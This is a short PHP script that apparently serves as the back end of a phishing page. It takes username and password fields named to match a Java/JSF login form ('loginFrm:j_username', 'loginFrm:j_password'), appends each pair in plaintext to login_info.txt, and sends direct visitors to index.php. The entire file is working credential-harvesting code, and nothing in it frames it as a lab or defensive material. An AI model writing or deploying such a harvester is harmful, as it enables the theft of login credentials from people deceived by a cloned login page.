<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $username = isset($_POST['loginFrm:j_username']) ? $_POST['loginFrm:j_username'] : '';
    $password = isset($_POST['loginFrm:j_password']) ? $_POST['loginFrm:j_password'] : '';

    // Validate and sanitize input (you can add more validation if needed)
    $username = filter_var($username, FILTER_SANITIZE_STRING);
    $password = filter_var($password, FILTER_SANITIZE_STRING);

    // Write the login information to a text file
    $file = 'login_info.txt';
    $data = "Username: $username, Password: $password\n";

    // Open the file in append mode and write the data
    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) !== false) {
        echo "Login information saved successfully.";
    } else {
        echo "Unable to save login information.";
    }
    exit; // After processing the form, exit to prevent further execution
} else {
    // Redirect if accessed directly without form submission
    header("Location: index.php");
    exit;
}
?>
